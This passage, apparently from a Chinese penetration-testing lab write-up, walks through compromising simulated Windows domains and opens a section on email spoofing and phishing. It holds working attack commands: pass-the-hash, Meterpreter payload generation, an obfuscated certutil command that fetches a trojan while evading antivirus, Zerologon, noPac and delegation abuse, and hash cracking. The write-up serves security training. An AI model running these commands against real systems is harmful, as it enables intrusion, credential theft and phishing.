class=&#34;built_in&#34;&gt;hash&lt;/span&gt;值。测试此&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;值与dc的通信。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.1.10 -u administrator -H hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现此&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;值就是dc的凭据，接下来就是利用此&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;进行木马下载，上传木马至dc，并突破火绒的限制，拿到dc的权限。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过msf生成hex的木马，撰写go脚本实现命令拼接式的无文件落地的免杀exe。并通过同样的方法将命令放在linux上开启的简易web上。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=6666 - f hex&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用CrackMapExec执行普通的命令执行时都会被视为威胁无法成功，通过如下的方式绕过火绒的检测，从linux上获取到木马并执行。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;c&amp;quot;&amp;quot;e&amp;quot;&amp;quot;r&amp;quot;&amp;quot;t&amp;quot;&amp;quot;u&amp;quot;&amp;quot;t&amp;quot;&amp;quot;i&amp;quot;&amp;quot;l&amp;quot; -&amp;quot;u&amp;quot;&amp;quot;r&amp;quot;&amp;quot;l&amp;quot;&amp;quot;c&amp;quot;&amp;quot;a&amp;quot;&amp;quot;c&amp;quot;&amp;quot;h&amp;quot;&amp;quot;e&amp;quot; -split -f [http://192.168.1.14:](http://192.168.1.14:)8000/5.exe c:/5.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载仍然是失败的，在此情况下，使用交互式方案下载木马，具体命令如下。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python smbexec.py -hashes :f1065013e55bbbeb64ddab768229710d xiaodi/administrator@192.168.1.10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以此方式打开的交互式 cmd，可以下载免杀木马并且执行成功上线。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;除了这种变异命令之外，还可以采用copy的方式，从域控上讲木马从linux上直接复制到其上，不过也是需要开启交互式的cmd进行木马的获取的。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;杀毒对外部的数据比较严格，对自己的数据比较宽松，可以生成票据从域控连接到域内主机，通过copy命令将exe木马从域内主机复制到域控上。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;vpc3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vpc3&#34;&gt;#&lt;/a&gt; vpc3&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-005.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）靶场 1 - Web 攻防&lt;/p&gt;
&lt;p&gt;（ 2 ）靶机 2 - MS17010 漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射尝试：（失败）（由于知道是工作组，所以不需要进行域登录，参数也要改）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.2.128- 129 - u administrator -H 53bd9892cea6f1d9ffa8ac587ba3cba6 --local-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MS17010-MSF判断和利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=47.94.236.117 LPORT=999 -f exe &amp;gt; m.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;检测：auxiliary/scanner/smb/smb_ms17_010&lt;br&gt;
 利用：exploit/windows/smb/ms17_010_eternalblue&lt;/p&gt;
&lt;p&gt;（ 3 ）靶机 3 - 口令获取&lt;br&gt;
密码喷射尝试：（成功）&lt;br&gt;
直接 CS 插件移动获取成功&lt;/p&gt;
&lt;p&gt;（ 4 ）靶机 4 - 通过 weblogic 获取&lt;br&gt;
密码喷射尝试：（失败）&lt;br&gt;
探针端口 7001 开放 - Weblogic - 利用漏洞攻击 - 工具利用&lt;br&gt;
上传 webshell-C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war\xiaodi.jsp&lt;br&gt;
 上传后门（反向）- 防火墙开启（扫描的时候发现被阻止）&lt;br&gt;
执行后门上线 CS&lt;/p&gt;
&lt;p&gt;（ 5 ）靶机 5&lt;br&gt;
 利用靶机 4 的口令横向移动得到&lt;/p&gt;
&lt;p&gt;（ 6 ）靶机 6&lt;br&gt;
CVE-2017-0146 不存在、CVE-2014-6324 太老、CVE-2021-42287 、CVE- 2022-26923 条件不满足。CVE-2020-1472 满足。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接DC清空凭证&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cve-2020-1472-exploit.py dc 192.168.10.10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取域内HASH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd impacket-0.9.23/examples/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python secretsdump.py dc\$@192.168.10.10 -just-dc -no-pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接域控PTH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python wmiexec.py -hashes :a402bea39d0f49b50ea1941120780ee3 xdorg/administrator@192.168.10.10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传后门至域内主机上&amp;amp;CS横向移动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy \\web\c$\6677.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6677.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connect 192.168.10.10 6677&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;vpc4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vpc4&#34;&gt;#&lt;/a&gt; vpc4&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-006.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）靶机 1 ：WEB&lt;br&gt;
tomcat 弱口令上传制作的 war 连接哥斯拉、上传 cs 后门执行上线，getsystem 进入域、探针内网 IP 段，定位域控，信息打点服务。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;提高权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getsystem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取前缀&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net view /domain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;定位域控&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net time /domain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;netbios前缀 jishu&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;域控 jishudc.jishu.xiaodi.vpc 192.168.2.20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）靶机 2 ：SQL&lt;br&gt;
 口令喷射失败&lt;br&gt;
 spn 扫描服务&lt;br&gt;
数据库配置文件翻阅，弱口令爆破（MSSQL）&lt;br&gt;
MDUT 代理转发 正向上线 主动连接上线&lt;/p&gt;
&lt;p&gt;（ 3 ）靶机 3 ：jishudc&lt;br&gt;
psexec CrackMapExec 口令喷射成功，横向拿下&lt;/p&gt;
&lt;p&gt;（ 4 ）靶机 4 ：xds&lt;br&gt;
 利用域管口令横向拿下&lt;br&gt;
获取前缀：net view /domain&lt;br&gt;
 获取到其他子域 xiaoshou&lt;br&gt;
xiaoshou.xiaodi.vpc&lt;/p&gt;
&lt;p&gt;（ 5 ）靶机 5 ：xsd&lt;br&gt;
 口令喷射不成功，有防火墙&lt;br&gt;
 80 端口拿下 - 通达 OA 漏洞利用 - Getshell&lt;br&gt;
 上传正向木马执行并主动连击&lt;br&gt;
获取域控 netbios 及域控 ip 地址&lt;/p&gt;
&lt;p&gt;（ 6 ）靶机 6 ：xiaoshoudc&lt;br&gt;
hash 匹配不上，采用漏洞提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;14、17 年的漏洞太老不选择，21、22 需要 一个域内的明文账户密码，前提条件不满足，选择 20 年的漏洞。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cve- 2020 - 1472 - exploit.py xiaoshoudc 192.168.3.20 shell noPac.exe -domain xiaoshou.xiaodi.vpc -user xiaosedi -pass xsd!@#45 /dc xiaoshoudc.xiaoshou.xiaodi.vpc /mAccount test /mPassword 12qwAS.. /service cifs /ptt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;及psexec进行利用拿权限：flag.txt口令传递拿下、&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell copy hack.php \\xiaoshoudc\c$\phpstudy_pro\www\hack.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 7 ）靶场 7 ：file 也可以采用 Nopac 提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;横向口令拿下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.4.11 -u administrator -H f1065013e55bbbeb64ddab768229710d --local-auth&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 8 ）靶场 8 ：fileadmin&lt;br&gt;
 资源约束委派&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取受害目标：有哪些域内计算机存在同一用户加入的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell AdFind.exe -h 192.168.4.20 -b &amp;quot;DC=xiaodi,DC=vpc&amp;quot; -f &amp;quot;objectClass=computer&amp;quot; mS-DS-CreatorSID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;判断受害用户：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell sid2user.exe \\192.168.4.20 5 21 3673262946 1983004332 2925526849 1103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell SharpAllowedToAct.exe -m xxxyyxxx -p xxyyx!@#45 -t file -a 192.168.4.20 xiaodi.vpc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python getST.py -dc-ip 192.168.4.20 xdvpc/fileadmin$:file!@#45 -spn cifs/fileadmin.xiaoshou.xiaodi.vpc -impersonate administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kerberos::ptc administrator.ccache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 9 ）靶场 9 ：dc&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdo&#34;&gt;https://github.com/Kevin-Robertson/Inveigh&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;监听拦截到 DC 的密文 ：Inveigh.exe&lt;br&gt;
 获取到的是 NET NTLM HASH V1 或 V2&lt;br&gt;
 破解得出明文： &lt;code&gt;hashcat.exe -a 3 -m 5600 xxxxxx ?l?l?l?l?l?s?s?s?d?d?d?d&lt;/code&gt; &lt;br&gt;
 通过 Inveigh.exe 获取的明文横向移动获取&lt;/p&gt;
&lt;h3 id=&#34;红队apt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#红队apt&#34;&gt;#&lt;/a&gt; 红队 APT&lt;/h3&gt;
&lt;h4 id=&#34;邮件钓鱼&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#邮件钓鱼&#34;&gt;#&lt;/a&gt; 邮件钓鱼&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;SPF 相关知识&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;什么是 SPF: 发件人策略框架（Sender Policy Framework）电子邮件认证机制，中文译为发送方策略框架，主要作用是防止伪造邮件地址。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如何判断SPF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dig -t txt qq.com //linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nslookup -type=txt qq.com //windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SPF相关显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;v=spf1 -all&amp;quot; (拒绝所有，表示这个域名不会发出邮件)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;v=spf1 +all&amp;quot; (接受所有)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;v=spf1 ip4:192.168.0.1/16 -all&amp;quot;(只允许 192.168.0.1/16 范围内的 IP 发送邮件)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;v=spf1 mx -all&amp;quot;(允许当前域名的 mx 记录对应的 IP 地址发送邮件) &amp;quot;v=spf1 mx mx:test.example.com -all&amp;quot;(允许当前域名和 test.example.com的 mx 记录对应的 IP 地址发送邮件)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;v=spf1 a mx ip4:173.194.72.103 -all&amp;quot;(允许当前域名的 a 记录和 mx 记录和一个给定的 IP 地址发送邮件)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;v=spf1 include:example.com -all&amp;quot;(采用和 example.com 一样的 SPF 记录)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Swaks 简单使用说明&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-t –to 目标地址 -t test@test.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-f –from 来源地址 (发件人) -f &amp;quot;text&amp;lt;text@text.com&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;–protocol 设定协议(未测试)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--body &amp;quot;http://www.baidu.com&amp;quot; //引号中的内容即为邮件正文; --header &amp;quot;Subject:hello&amp;quot; //邮件头信息，subject为邮件标题 -ehlo 伪造邮件 ehlo 头&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--data ./Desktop/email.txt //将TXT文件作为邮件发送;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;gophish 安装使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLmdldGdvcGhpc2guY29tLw==&#34;&gt;https://docs.getgophish.com/&lt;/span&gt;&lt;br&gt;
 项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dvcGhpc2gvZ29waGlzaA==&#34;&gt;https://github.com/gophish/gophish&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）无 SPF 直接伪造 - Swaks&lt;/p&gt;
